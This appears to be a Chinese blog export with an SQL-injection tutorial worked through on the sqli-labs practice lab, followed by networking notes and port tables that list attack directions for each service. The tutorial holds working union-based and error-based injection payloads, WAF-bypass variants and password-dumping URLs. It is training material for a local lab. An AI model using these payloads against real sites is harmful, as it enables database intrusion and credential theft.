<h2 id="注入产生的原因"><a href="#注入产生的原因" class="headerlink" title="注入产生的原因"></a><strong>注入产生的原因</strong></h2><ol>
<li><strong>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</strong></li>
<li><strong>过滤不严格。</strong></li>
<li><strong>数据库配置不当。</strong></li>
<li><strong>转义不当。</strong></li>
</ol>
<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入， 但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>
<ol>
<li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li>
<li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li>
<li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li>
</ol>
<hr>
<h2 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a><strong>数据库信息收集</strong></h2><p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到 <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p>
<p><code>/*!*/</code> 意为在xxx版本之上执行 我的版本是5.6所以可以执行</p>
<p>路径的话一般用<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p>
<p><code>system_user()</code> //系统用户名 <code>user()</code> // 用户名 <code>current_user()</code> //当前用户名 <code>session_user()</code> //链接数据库的用户名</p>
<p>读取host与user</p>
<p>通过以上信息还能大概判断下是不是站库分离之类的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select version(),@@version,user();</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| id                | username          | password       |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| 1                 | admin             | admin          |</span><br><span class="line">| 10.3.20-MariaDB-1 | 10.3.20-MariaDB-1 | root@localhost |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select 1,host,user from mysql.user;</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">| id   | username  | password |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    1 | localhost | root     |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a><strong>注入实战</strong></h2><h3 id="Sqli-Less-1"><a href="#Sqli-Less-1" class="headerlink" title="Sqli/Less-1"></a><strong>Sqli/Less-1</strong></h3><p>简单检测下，是字符型注入，推测语句为  <strong>select x,x from xxx where x=’id’ limit 0,1</strong></p>
<p>同时#被过滤，但 –+ 可以</p>
<p>order by 猜测 列数  —-爆出为3列</p>
<p>limit 2，1 表示 从第3条开始取，取1条，即3</p>
<p>limit 3，4 表示从第4条开始取，取4条，即4-7</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=-2' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>可以爆出所有表–emails,referers,uagents,users</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-2&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br></pre></td></tr></table></figure>

<p>可以爆出user表下的所有列—id,username,password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-2&#39; union select 1,group_concat(id,username,password),3 from users -- +</span><br></pre></td></tr></table></figure>

<p>爆字段—</p>
<p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity</p>
<p>总结：group_concat()可以聚合起来，查看更方便</p>
<p>如果 group_concat()被过滤，可以用它的替代函数——</p>
<p>当我们使用 <code>information_schema.schemata</code> 时被拦截了,我们可以这样绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;information_schema&#96;.&#96;schemata &#96;  </span><br><span class="line">information_schema&#x2F;**&#x2F;.schemata</span><br><span class="line">information_schema&#x2F;*!*&#x2F;.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>

<p>users表被拦截，可以用以下方法绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">security.users 数据库名 加表名</span><br><span class="line">security.&#96;users&#96;</span><br></pre></td></tr></table></figure>



<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a><strong>1.floor()</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and(select 1 from </span><br><span class="line"> (</span><br><span class="line">     select </span><br><span class="line">     count(*),</span><br><span class="line">     concat(user(),floor(rand(0)*2))  x </span><br><span class="line">     from </span><br><span class="line">     information_schema.tables </span><br><span class="line">     group by </span><br><span class="line">     x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>

<p>Q1.floor()函数是什么？</p>
<p>A1.floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
<p>Q2.rand(0)是什么意思？</p>
<p>A2.rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成</p>
<p>这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，这样每次注入都会报错，而rand()则需要碰运气了</p>
<p>Q3.为什么会出现报错？</p>
<p>A3.我们看一下报错的内容：Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
<p>意思是说group_key条目重复。我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
<p>在这张虚拟表中，group  by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，</p>
<p>第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；</p>
<p>第二次是假设group  by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a><strong>2.extractvalue()</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<p>每个一个报错语句都有它的原理 比如 <code>exp()</code> 报错的原理 ,手册说到exp是一个数学函数 取e的x次方，当我们输入的值大于709就会报错 然后~取反它的值总会大于709所以报错。</p>
<p>简单的用报错语句来注入一下把这里我就利用函数 <code>updatexml()</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: 是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>

<p>其中关键点就是<code>XPath_string</code> 这块了 因为我们传入的的不是<code>XPath_string</code></p>
<p>为什么要使用<code>concat</code> 这个函数呢，因为它是个连接函数你不用的话<code>(updatexml(1,(select user()),1))</code> 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到<code>concat</code>用特殊字符给他连接起来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">爆库：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name&#x3D;0x7573657273 limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆数据：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +</span><br></pre></td></tr></table></figure>

<p>在报错里面直接使用 MySQL最基本的查表就可以了,你也可以把concat放在外面 </p>
<p><code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>
<p>自己灵活多变，这里我值得注意的是它加了连接字符md5只能爆出31位,你可以用分割函数分割出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串</span><br><span class="line"></span><br><span class="line">start为起始位置</span><br><span class="line"></span><br><span class="line">length为长度</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>

<hr>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>计网基础</title>
    <url>/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h2><p><strong>osi七层模型：</strong></p>
<p><strong>物理层-链路层-网络层-运输层-会话层-表示层-应用层</strong></p>
<p>只要遵循 OSI 标准，一个系统就可以和位于世界上任何地方的、也遵循这同一标准的其他任何系统进行通信。</p>
<p>但是OSI在市场化方面是失败的—过于复杂等因素</p>
<p><strong>TCP/IP 获得了最广泛的应用–四层体系结构</strong></p>
<p><strong>应用层–运输层–网际层–网络接口层</strong></p>
<p>还有折中的五层体系结构： <strong>物理层–数据链路层–网络层–运输层–应用层</strong></p>
<hr>
<p><strong>实体：</strong>表示任何可发送或接收信息 的硬件或软件进程</p>
<p>同一系统相邻两层的实体进行交互的地方，称为 <strong>服务访问点 SAP (Service Access Point)</strong></p>
<p><strong>PDU（protocol data unit）</strong>每一层使用自己层的协议和别的系统对应层相互通信，交换的信息叫做<strong>协议数据单</strong></p>
<p><strong>• 上三层：message 消息</strong> </p>
<p><strong>• 传输层：segment 数据段</strong></p>
<p><strong>• 网络层：packet 包</strong></p>
<p><strong>• 链路层：frame 帧</strong></p>
<p><strong>• 物理层：bit     比特流</strong></p>
<p>互联网组成 按工作方式划分为以下的两部分： </p>
<p><strong>(1)边缘部分</strong> 所有连接在互联网上的主机用户直接使用，进行通信和资源共享</p>
<p><strong>(2)核心部分</strong> 大量网络和连接网络的设备组成为边缘部分提供连通交换</p>
<p>互联网的边缘部分–两种通信方式 </p>
<p><strong>• 客户–服务器方式</strong>（<strong>C/S 方式）</strong> 即Client/Server方式 </p>
<p><strong>• 对等方式（P2P 方式）</strong> 即 Peer-to-Peer方式</p>
<hr>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a><strong>网络层</strong></h2><h3 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><strong>网际协议IP</strong></h3><p>与 IP 协议配套使用的还有三个协议： </p>
<p><strong>– 地址解析协议 ARP (Address Resolution Protocol)</strong> </p>
<p><strong>– 网际控制报文协议 ICMP (Internet Control Message Protocol)</strong> </p>
<p><strong>– 网际组管理协议 IGMP (Internet Group Management Protocol)</strong></p>
<p><strong>IP 地址 ::= { &lt;网络号&gt;, &lt;主机号&gt;}</strong> </p>
<p><strong>网络号net-id</strong>，它标志主机（或路由器）所连接到的网络</p>
<p><strong>主机号host-id</strong>，它标志该主机 （或路由器）</p>
<table>
<thead>
<tr>
<th></th>
<th>网络数目</th>
<th>第一个可用的网络号</th>
<th>最后一个课用的网络号</th>
<th>最大的主机数</th>
</tr>
</thead>
<tbody><tr>
<td>A类</td>
<td>126 (2^7-1)</td>
<td>1</td>
<td>126</td>
<td>1600万</td>
</tr>
<tr>
<td>B类</td>
<td>16383  (2^14-1)</td>
<td>128.1</td>
<td>191.255</td>
<td>65534</td>
</tr>
<tr>
<td>C类</td>
<td>2^21 -1</td>
<td>192.0.1</td>
<td>223.255.255</td>
<td>254</td>
</tr>
</tbody></table>
<p> <strong>特殊的IP地址</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这三个网段是私有地址，可以用于自己组网使用，这些地址主要用于企业内部网络中</span></span><br><span class="line"><span class="comment">#而使用这三个网段的计算机要上网必须要通过地址翻译（NAT），将私有地址翻译成公用合法的IP地址</span></span><br><span class="line"><span class="number">10</span>.*.*.*    <span class="number">172.16</span>.*.*    <span class="number">172.31</span>.*.*   <span class="number">192.168</span>.*.*  </span><br><span class="line"></span><br><span class="line"><span class="comment">#如果你的主机使用了DHCP功能自动获得一个ip地址，那么当你的DHCP服务器发生故障或响应时间太长而超出系统规定的一个时间，windows系统会为你分配这样一个地址</span></span><br><span class="line"><span class="number">169.254</span>.*.*</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制广播地址。对本机来说，这个地址指本网段内(同一广播域)的所有主机。如果翻译成人类的语言，应该是这样：“这个房间里的所有人都注意了！”这个地址不能被路由器转发。</span></span><br><span class="line"><span class="number">255.255</span>.<span class="number">255.255</span></span><br></pre></td></tr></table></figure>

<p>在同一个局域网上的主机或路由器 他们IP地址的网络号必须是一样</p>
<p>路由器总是具有<strong>两个或两个以上的IP地址</strong>。 路由器的每一个接口都有一个不同网络号的IP地址</p>
<hr>
<h3 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><strong>地址解析协议 ARP</strong></h3><p>数据链路层的帧 必须使用硬件地址</p>
<p>每一个主机都有一个 ARP 高速缓存(ARP cache) </p>
<p>– 映射表–存放局域网上的各主机、路由器的 IP 地址和 硬件地址 </p>
<p>– 减少网络上的通信量 </p>
<p>• 主机 A 向本网的主机 B 发送 IP 数据报 </p>
<p>根据IP地址查找 ARP 高速缓存 </p>
<p>– 如有，将硬件地址写入 MAC 帧</p>
<p>– 如没有，ARP请求广播，如下图</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/1.png" style="zoom:80%;">

<p>• ARP 是解决<strong>同一个局域网上</strong>的主机或路由器 的 IP 地址和硬件地址的映射问题</p>
<p> • 如果所要找的主机和源主机不在同一个局域网上，那么网关来了</p>
<p> <strong>• 网关-</strong>-网络层以上使用的中间设备，很少用 </p>
<p>​          –路由器的旧称</p>
<p><strong>• 使用 ARP 的四种典型情况</strong></p>
<p> • 发送方是主机，要把IP数据报发送到本网络上的另一个主 机。这时用 ARP 找到目的主机的硬件地址。 </p>
<p>• 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到网关硬件地址。剩下的工作由 网关来完成。 </p>
<p>• 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。</p>
<p>• 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上另一个路由器的硬 件地址。剩下的工作由这个路由器来完成</p>
<hr>
<h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a><strong>划分子网</strong></h3><p>早期IP 地址的设计确实不够合理<br>– 两级的 IP 地址不够灵活<br>– IP 地址空间的利用率有时很低<br>– 路由表太大，网络性能差</p>
<p><strong>划分子网(subnetting)</strong></p>
<p>– 互联网的正式标准协议 </p>
<p>– 在 IP 地址中增加 “子网号字段” subnet-id </p>
<p>– 子网号是借用若干位的主机号 </p>
<p>– 两级IP 地址变为三级 IP 地址<br>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}</p>
<p>通常 划分子网是一个单位内部事情 外网看不见划分情况 </p>
<p>这个单位对外仍然表现为一个网络。 </p>
<p>– 从其他网络发送给本单位某个主机的 IP 数据报 </p>
<p>– 仍然根据 IP 数据报的<strong>目的网络号 net-id</strong>，先找到连接 在本单位网络上的路由器</p>
<p>– 单位网<strong>路由器</strong>收到后，再按目的网络号 net-id 和子网 号 subnet-id 找到目的子网</p>
<p>– 最后将 IP 数据报直接交付目的主机</p>
<p><strong>如何判断是否划分子网？</strong></p>
<p>• 从IP数据报的首部无法判断 </p>
<p><strong>• 使用子网掩码(subnet mask)</strong></p>
<hr>
<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a><strong>运输层</strong></h2><p>TCP/IP 的运输层有两个不同的协议： </p>
<p><strong>(1)用户数据报协议 UDP   (User Datagram Protocol)</strong> </p>
<p>– 当运输层采用无连接的 UDP 协议时，这种逻辑通信信 道是一条不可靠信道。 </p>
<p><strong>(2) 传输控制协议 TCP     (Transmission Control Protocol)</strong> </p>
<p>– 当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条全双工的可靠信道。</p>
<p>TCP 最主要的特点 </p>
<p>• TCP 是面向连接的           <strong>• 每一条 TCP 连接只能有两个端点</strong> 只能是点对点（一对一）</p>
<p>• TCP 提供可靠交付的服务 <strong>无差错，不丢失，不重复，按序到达</strong></p>
<p>• TCP 提供全双工通信 • TCP 是面向字节流的</p>
<h3 id="三次握手建立-TCP-连接"><a href="#三次握手建立-TCP-连接" class="headerlink" title="三次握手建立 TCP 连接"></a><strong>三次握手建立 TCP 连接</strong></h3><p><strong>A 的 TCP 向 B</strong> 发出连接请求报文段，其首部中的同步位 SYN = 1，并选择序号 seq = x，</p>
<p>表明传送数据时的第一个数据字节的序号是 x。</p>
<p><strong>B 的 TCP 收到连接</strong>请求报文段后，如同意，则 发回确认。</p>
<p>B 在确认报文段中应使 SYN = 1，使 ACK = 1， 其确认号ack = x + 1，自己选择的序号 seq = y。</p>
<p><strong>A 收到此报文段后</strong>向 B 给出确认，其ACK = 1， 确认号 ack = y + 1,  A 的 TCP 通知上层应用进程，连接已经建立</p>
<p><strong>B 的 TCP 收到主机A 的确认后</strong>，也通知其上层 应用进程：TCP 连接已经建立。</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/2.png" style="zoom:80%;">

<hr>
<p>三类端口 </p>
<p>• 熟知端口，数值一般为 0~1023。 </p>
<p>• 登记端口号，数值为1024~49151，为没有熟知 端口号的应用程序使用的。使用这个范围的端口 号必须在 IANA 登记，以防止重复。 </p>
<p>• 客户端口号或短暂端口号，数值为49152~65535， 留给客户进程选择暂时使用。当服务器进程收到 客户进程的报文时，就知道了客户进程所使用的 动态端口号。通信结束后，这个端口号可供其他 客户进程以后使</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a><strong>应用层</strong></h2><p>超文本传送协议 HTTP<br>• 用户点击鼠标后所发生的事件</p>
<p> (1) 浏览器分析超链指向页面的 URL。</p>
<p> (2) 浏览器向 DNS 请求解析 <a href="http://www.tsinghua.edu.cn" target="_blank" rel="noopener">www.tsinghua.edu.cn</a> 的 IP 地址。</p>
<p> (3) 域名系统 DNS 解析出清华大学服务器的 IP 地址。</p>
<p> (4) 浏览器与服务器建立 TCP 连接 </p>
<p>(5) 浏览器发出取文件命令： GET /chn/yxsz/index.htm。</p>
<p> (6) 服务器给出响应，把文件 index.htm 发给浏览器。</p>
<p> (7) TCP 连接释放。 </p>
<p>(8) 浏览器显示“清华大学院系设置”文件 index.htm 中的所 有文本。</p>
<h3 id="HTTPS加密协议过程："><a href="#HTTPS加密协议过程：" class="headerlink" title="HTTPS加密协议过程："></a><strong>HTTPS加密协议过程：</strong></h3><p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服m务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<hr>
<h2 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a><strong>常用端口</strong></h2><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a><strong>文件共享服务端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>21/69</strong></td>
<td><strong>FTP/TFTP 文件传输协议</strong></td>
<td><strong>允许匿名上传、下载、爆破和嗅探</strong></td>
</tr>
<tr>
<td><strong>2049</strong></td>
<td><strong>NFS 服务</strong></td>
<td><strong>配置不当</strong></td>
</tr>
<tr>
<td><strong>139</strong></td>
<td><strong>Samba 服务</strong></td>
<td><strong>爆破、未授权访问、远程代码执行</strong></td>
</tr>
<tr>
<td><strong>389</strong></td>
<td><strong>LDAP 目录访问协议</strong></td>
<td><strong>注入、允许匿名访问、弱口令</strong></td>
</tr>
</tbody></table>
<h3 id="远程连接服务器端口"><a href="#远程连接服务器端口" class="headerlink" title="远程连接服务器端口"></a><strong>远程连接服务器端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>22</strong></td>
<td><strong>SSH远程连接</strong></td>
<td><strong>爆破、SSH隧道及内网代理转发、文件传输</strong></td>
</tr>
<tr>
<td><strong>23</strong></td>
<td><strong>Telnet远程登录服务</strong></td>
<td><strong>爆破、嗅探、弱口令</strong></td>
</tr>
<tr>
<td><strong>3389</strong></td>
<td><strong>RDP远程桌面连接</strong></td>
<td><strong>Shift后门(Windows Server 2003以下版本)、爆破</strong></td>
</tr>
<tr>
<td><strong>5900</strong></td>
<td><strong>VNC</strong></td>
<td><strong>弱口令爆破</strong></td>
</tr>
<tr>
<td><strong>5632</strong></td>
<td><strong>PyAnywhere服务</strong></td>
<td><strong>抓密码、代码执行</strong></td>
</tr>
</tbody></table>
<p><strong>22端口：</strong>传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的，就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式，就是“中间人”冒充真正的服务器接收你的传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”一转手做了手脚之后，就会出现很严重的问题。</p>
<p>SSH的英文全称是Secure  SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够<strong>防止DNS和IP欺骗</strong>。还有一个额外的好处就是<strong>传输的数据是经过压缩</strong>的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道”。 </p>
<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a><strong>Web应用服务端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>80/443/8080</strong></td>
<td><strong>常见Web服务端口</strong></td>
<td><strong>Web攻击、爆破、对应服务版本漏洞</strong></td>
</tr>
<tr>
<td><strong>7001/70022</strong></td>
<td><strong>Weblogic控制台</strong></td>
<td><strong>Java 反序列化、弱口令</strong></td>
</tr>
<tr>
<td><strong>8080/8089</strong></td>
<td><strong>Jboos/Resin/Jetty/Jenkins</strong></td>
<td><strong>反序列化、控制台弱口令</strong></td>
</tr>
<tr>
<td><strong>9090</strong></td>
<td><strong>WebSphere控制台</strong></td>
<td><strong>Java 反序列化、弱口令</strong></td>
</tr>
<tr>
<td><strong>4848</strong></td>
<td><strong>GlassFish控制台</strong></td>
<td><strong>弱口令</strong></td>
</tr>
<tr>
<td><strong>1352</strong></td>
<td><strong>Lotus dominion邮件服务</strong></td>
<td><strong>弱口令、信息泄露、爆破</strong></td>
</tr>
<tr>
<td><strong>10000</strong></td>
<td><strong>Webmin-Web控制面板</strong></td>
<td><strong>弱口令</strong></td>
</tr>
</tbody></table>
<h3 id="数据库端口"><a href="#数据库端口" class="headerlink" title="数据库端口"></a><strong>数据库端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>3306</strong></td>
<td><strong>MySQL</strong></td>
<td><strong>注入、提权、爆破</strong></td>
</tr>
<tr>
<td><strong>1433</strong></td>
<td><strong>MSSQL</strong></td>
<td><strong>注入、提权、SAP弱口令、爆破</strong></td>
</tr>
<tr>
<td><strong>1521</strong></td>
<td><strong>Oracle</strong></td>
<td><strong>TNS爆破、注入、反弹Shell</strong></td>
</tr>
<tr>
<td><strong>5432</strong></td>
<td><strong>PostgreSQL</strong></td>
<td><strong>爆破、注入、弱口令</strong></td>
</tr>
<tr>
<td><strong>27017/27018</strong></td>
<td><strong>MongoDB</strong></td>
<td><strong>爆破、未授权访问</strong></td>
</tr>
<tr>
<td><strong>6379</strong></td>
<td><strong>Redis</strong></td>
<td><strong>未授权访问、弱口令爆破</strong></td>
</tr>
<tr>
<td><strong>5000</strong></td>
<td><strong>SysBase/DB2</strong></td>
<td><strong>爆破、注入</strong></td>
</tr>
</tbody></table>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a><strong>邮件服务端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>25</strong></td>
<td><strong>SMTP 邮件服务</strong></td>
<td><strong>邮件伪造</strong></td>
</tr>
<tr>
<td><strong>109/110</strong></td>
<td><strong>POP2/POP3</strong></td>
<td><strong>爆破、嗅探</strong></td>
</tr>
<tr>
<td><strong>143</strong></td>
<td><strong>IMAP</strong></td>
<td><strong>爆破</strong></td>
</tr>
</tbody></table>
